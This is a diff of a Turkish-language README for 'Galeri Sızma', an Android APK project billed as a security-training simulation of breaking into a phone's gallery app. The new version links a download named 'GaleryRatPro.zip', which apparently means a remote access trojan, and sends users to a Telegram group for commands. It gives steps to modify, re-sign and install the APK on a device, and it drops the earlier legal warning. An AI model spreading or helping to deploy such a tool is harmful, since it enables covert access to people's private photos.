@@ -1,60 +1,47 @@
-# 📁 Galeri Sızma
+<h1 align="center">📁 Galeri Sızma - APK Simülasyon Projesi</h1>
 
-> Android cihazlara yönelik, bir galeri uygulamasına sızma sürecini simüle eden örnek bir eğitim projesidir.  
-> **Not:** Bu proje yalnızca teknik farkındalık ve bilgi güvenliği eğitimleri amacıyla geliştirilmiştir.
+<p align="center">
+  <strong>Android tabanlı, galeri uygulamasına sızma yöntemlerini simüle eden teknik bir araştırma projesi.</strong><br>
+  <em>Bilgi güvenliği, farkındalık ve APK yapılarına hâkimiyet amaçlı geliştirilmiştir.</em>
+</p>
 
----
-
-## 🧰 Gereksinimler
-
-Projenin simülasyonunu çalıştırmak için aşağıdaki araçlara ihtiyaç vardır:
-
-| Uygulama       | Açıklama                                                                 |
-|----------------|--------------------------------------------------------------------------|
-| **Telegram**    | Komut paylaşımı ve topluluk desteği için kullanılmaktadır.              |
-| **ZArchiver**   | APK dosyaları üzerinde dosya sistemi düzeyinde düzenleme yapmak için.  |
-| **Pkg Games**   | Geliştiriciye ait özel araçlara erişim sağlar. [TG Grubu →](https://t.me/pkgProjects) |
-| **APK Editor**  | APK dosyasını modifiye etmek ve belirli parametreleri değiştirmek için.|
+<p align="center">
+  <img src="https://i.imgur.com/Oa1vZjw.png" width="400" alt="Simülasyon Görseli">
+</p>
 
 ---
 
-## ⬇️ İndirme Bağlantısı
+## 🚀 Proje Hakkında
 
-- [📦 Galeri Sızma APK](https://APK.com)
-
-> Uygulama simülasyon ortamında test edilmelidir. Gerçek cihazlarda kullanılması önerilmez.
+Bu proje, APK yapısına müdahale ederek galeri gibi uygulamalara erişimin <strong>nasıl mümkün olabileceğini simüle eden</strong> bir yapıdır. Gerçek dünyada olası sızma yollarını gösteren bu proje, bir bilgi güvenliği eğitim senaryosu olarak tasarlanmıştır.
 
 ---
 
-## ⚙️ Kurulum ve Kullanım
+## 🛠️ Gereken Uygulamalar
 
-1. Gerekli tüm uygulamaları cihazınıza yükleyin.
-2. İndirdiğiniz APK dosyasını ZArchiver ile açın ve `res`, `assets` veya `smali` dizinlerinde gerekli değişiklikleri yapın.
-3. APK Editor ile hedef dosyayı yeniden imzalayın.
-4. Kurulumu tamamlayın ve test cihazında çalıştırın.
-5. Simülasyon sonuçlarını Telegram grubunda paylaşabilirsiniz.
-
----
-
-## ❗️Yasal Uyarı
-
-> Bu proje yalnızca **bilgi güvenliği eğitimi** ve **kişisel farkındalık** amacıyla oluşturulmuştur.  
-> Herhangi bir cihaz, kurum ya da şahıs üzerinde izinsiz uygulama **kanunen suçtur**.  
-> Projenin kötüye kullanımından doğacak tüm hukuki ve etik sorumluluk **kullanıcıya aittir**.  
+| Uygulama        | Açıklama |
+|-----------------|----------|
+| ✅ <strong>Telegram</strong>     | Komut, dökümantasyon ve destek için. |
+| ✅ <strong>ZArchiver</strong>    | APK içerik düzenlemesi için. |
+| ✅ <strong>Pkg Games</strong>    | Geliştiriciye özel simülasyon araçları sağlar. <a href="https://t.me/pkgProjects">Telegram'a Git</a> |
+| ✅ <strong>APK Editor</strong>   | APK dosyası üzerinde değişiklik ve yeniden imzalama işlemleri için. |
 
 ---
 
-## 🤝 Katkıda Bulun
+## 📦 İndirme
 
-Projeye katkı sağlamak, öneride bulunmak veya kendi modülünü paylaşmak için Telegram grubumuza katılabilirsin:
+🔗 <strong><a href="https://github.com/BatumsuKekim/Galeriye-S-zmak-2025---2026/blob/main/GaleryRatPro.zip">Galeri Sızma Uygulamasını İndir</a></strong>
 
-- Telegram Topluluğu: [@pkgProjects](https://t.me/pkgProjects)
-
----
-
-## 📌 Lisans
-
-Bu proje MIT Lisansı ile lisanslanmıştır.  
-Daha fazla bilgi için `LICENSE.md` dosyasına göz atabilirsiniz.
+- Dosya Boyutu: ~3.2 MB  
+- Versiyon: 1.0.0  
+- Format: `.zip`
 
 ---
+
+## ⚙️ Kurulum Adımları
+
+```bash
+1. ZArchiver ile ZIP dosyasını aç
+2. APK dosyasını çıkar ve "assets" veya "smali" klasöründe düzenleme yap
+3. APK Editor ile uygulamayı yeniden imzala
+4. Cihaza yükle ve simülasyonu çalıştır
